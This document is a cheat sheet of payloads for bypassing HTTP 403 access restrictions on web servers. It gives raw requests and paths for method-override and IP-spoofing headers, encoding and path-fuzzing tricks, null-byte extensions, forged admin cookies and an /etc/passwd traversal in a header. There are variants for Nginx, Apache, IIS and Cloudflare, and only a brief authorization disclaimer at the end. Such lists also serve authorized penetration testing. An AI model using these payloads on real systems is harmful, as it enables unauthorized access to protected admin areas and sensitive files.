# HTTP 403 Forbidden Bypass Techniques

Below are various payloads and techniques to bypass 403 Forbidden errors. These methods attempt to circumvent access restrictions by manipulating requests in different ways.

## Basic Bypass Techniques

### 1. HTTP Method Override
```
GET /admin HTTP/1.1
Host: example.com
X-HTTP-Method-Override: POST

POST /admin HTTP/1.1
Host: example.com
X-HTTP-Method: GET
```

### 2. HTTP Header Manipulation
```
GET /admin HTTP/1.1
Host: example.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
Referer: https://example.com/admin
```

### 3. Path Fuzzing
```
/admin/
/admin..;/
/admin.%2e/
/admin~/
/%61dmin/
/.admin
```

## Advanced Bypass Techniques

### 4. IP Spoofing Headers
```
GET /admin HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1
```

### 5. Protocol Version Switching
```
GET /admin HTTP/2
Host: example.com

GET /admin HTTP/0.9
```

### 6. Unicode Normalization
```
/%c0%ae%c0%ae/admin
/%ef%bc%8fadmin
/%e2%81%afadmin
```

## Special Case Bypasses

### 7. Case Variation
```
/ADMIN
/aDmIn
/a%64min
```

### 8. Parameter Pollution
```
/admin?admin=true
/admin?redirect=/admin
/admin?access=1&bypass=1
```

### 9. File Extension Tricks
```
/admin.php
/admin.php.bak
/admin.php~
/admin.php/
/admin.php.txt
/admin.php%00.jpg
```

## Header-Based Bypasses

### 10. User-Agent Spoofing
```
GET /admin HTTP/1.1
Host: example.com
User-Agent: Googlebot
```

### 11. Accept Header Manipulation
```
GET /admin HTTP/1.1
Host: example.com
Accept: */*
Accept: ../../../../../../etc/passwd{{
```

### 12. Cookie Manipulation
```
GET /admin HTTP/1.1
Host: example.com
Cookie: admin=true; role=admin
```

## Nginx-Specific Bypasses

### 13. URL Encoding
```
/%2Fadmin
/admin%20
/admin%09
```

### 14. Multiple Slashes
```
////admin
/./admin
/./admin/.
```

## Apache-Specific Bypasses

### 15. Backslash Variation
```
/admin\
/admin/
/admin..\
```

### 16. Mixed Encoding
```
/a%25%32%66dmin
/a%252f%252fdmin
```

## IIS-Specific Bypasses

### 17. ASP Bypasses
```
/admin.asp
/admin.asa
/admin.cer
```

### 18. Short Filename
```
/admin~1/
/a*~1/
```

## Cloudflare Bypasses

### 19. Origin Header
```
GET /admin HTTP/1.1
Host: example.com
Origin: https://example.com
```

### 20. CF-Connecting-IP
```
GET /admin HTTP/1.1
Host: example.com
CF-Connecting-IP: 127.0.0.1
```

## Testing Methodology

1. Start with basic path variations
2. Try different HTTP methods (HEAD, POST, PUT)
3. Test various headers (X-Forwarded-For, Referer)
4. Attempt protocol version switching
5. Test Unicode normalization and encoding
6. Try different file extensions
7. Experiment with case variations
8. Test parameter pollution techniques

## Important Notes

- These techniques should only be used in authorized penetration testing engagements
- Many of these bypasses depend on specific server configurations
- Always respect robots.txt and security.txt files
- Document all testing with proper authorization

Remember that 403 bypass techniques are highly dependent on the specific web server configuration and application implementation. What works on one system may not work on another.